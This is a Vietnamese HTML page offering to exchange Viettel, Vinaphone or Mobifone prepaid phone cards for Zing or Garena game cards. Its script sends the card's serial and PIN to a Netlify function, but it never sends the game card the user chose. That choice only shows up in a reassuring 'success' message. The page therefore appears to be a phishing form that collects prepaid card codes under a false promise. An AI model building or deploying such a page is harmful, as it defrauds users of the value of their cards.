<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hệ Thống Đổi Thẻ Nhanh</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #121212; color: #e0e0e0; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card-box { background: #1e1e1e; width: 100%; max-width: 380px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; }
        h2 { text-align: center; color: #00ff88; margin-bottom: 25px; letter-spacing: 1px; }
        label { display: block; margin-top: 15px; font-size: 13px; font-weight: 600; color: #888; text-transform: uppercase; }
        select, input { width: 100%; padding: 12px; margin-top: 8px; border: 1px solid #333; border-radius: 10px; background: #252525; color: #fff; box-sizing: border-box; font-size: 15px; }
        input:focus { border-color: #00ff88; outline: none; }
        .btn-process { width: 100%; padding: 15px; margin-top: 30px; background: #00ff88; color: #000; border: none; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
        .btn-process:hover { background: #00cc6e; transform: translateY(-2px); }
        #loading { display: none; text-align: center; margin-top: 20px; color: #00ff88; font-style: italic; }
        #status { display: none; margin-top: 20px; padding: 15px; border-radius: 10px; text-align: center; font-weight: 500; }
        .success { background: rgba(0, 255, 136, 0.1); color: #00ff88; border: 1px solid #00ff88; }
        .error { background: rgba(255, 68, 68, 0.1); color: #ff4444; border: 1px solid #ff4444; }
    </style>
</head>
<body>

<div class="card-box">
    <h2>HỆ THỐNG ĐỔI THẺ</h2>
    
    <label>1. Chọn loại thẻ cào:</label>
    <select id="type_in">
        <option value="VIETTEL">Viettel</option>
        <option value="VINAPHONE">Vinaphone</option>
        <option value="MOBIFONE">Mobifone</option>
    </select>

    <label>2. Mệnh giá thẻ:</label>
    <select id="amount">
        <option value="10000">10.000đ</option>
        <option value="20000">20.000đ</option>
        <option value="50000">50.000đ</option>
        <option value="100000">100.000đ</option>
        <option value="200000">200.000đ</option>
        <option value="500000">500.000đ</option>
    </select>

    <input type="text" id="seri" placeholder="Nhập số Seri thẻ">
    <input type="text" id="pin" placeholder="Nhập mã thẻ (PIN)">

    <label>3. Đổi sang loại thẻ game:</label>
    <select id="type_out">
        <option value="ZING">Nhận thẻ Zing (VNG)</option>
        <option value="GARENA">Nhận thẻ Garena</option>
    </select>

    <button class="btn-process" onclick="startExchange()">ĐỔI THẺ NGAY</button>

    <div id="loading">Vui lòng chờ giây lát...</div>
    <div id="status"></div>
</div>

<script>
    async function startExchange() {
        const pin = document.getElementById('pin').value.trim();
        const seri = document.getElementById('seri').value.trim();
        const type = document.getElementById('type_in').value;
        const amount = document.getElementById('amount').value;
        const target = document.getElementById('type_out').options[document.getElementById('type_out').selectedIndex].text;
        const statusDiv = document.getElementById('status');

        if(!pin || !seri) {
            alert("Vui lòng điền đầy đủ mã thẻ và seri!");
            return;
        }

        statusDiv.style.display = "none";
        document.getElementById('loading').style.display = "block";

        try {
            // Đã sửa đường dẫn fetch: KHÔNG CÓ DẤU CHẤM ở đầu
            const response = await fetch('/netlify/functions/send-card', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ pin, seri, type, amount })
            });
            
            const data = await response.json();
            document.getElementById('loading').style.display = "none";
            statusDiv.style.display = "block";

            if (data.status === 1 || data.status === 99) {
                statusDiv.className = "success";
                statusDiv.innerHTML = `<b>GỬI THẺ THÀNH CÔNG!</b><br>Đang duyệt đổi sang <b>${target}</b>. Kết quả sẽ có sau 1-3 phút.`;
            } else {
                statusDiv.className = "error";
                statusDiv.innerHTML = "<b>LỖI:</b> " + (data.message || "Thẻ không hợp lệ hoặc đã dùng.");
            }
        } catch (e) {
            document.getElementById('loading').style.display = "none";
            statusDiv.style.display = "block";
            statusDiv.className = "error";
            statusDiv.innerHTML = "<b>LỖI KẾT NỐI:</b> Không thể gửi dữ liệu lên Server Netlify!";
        }
    }
</script>
</body>
</html>
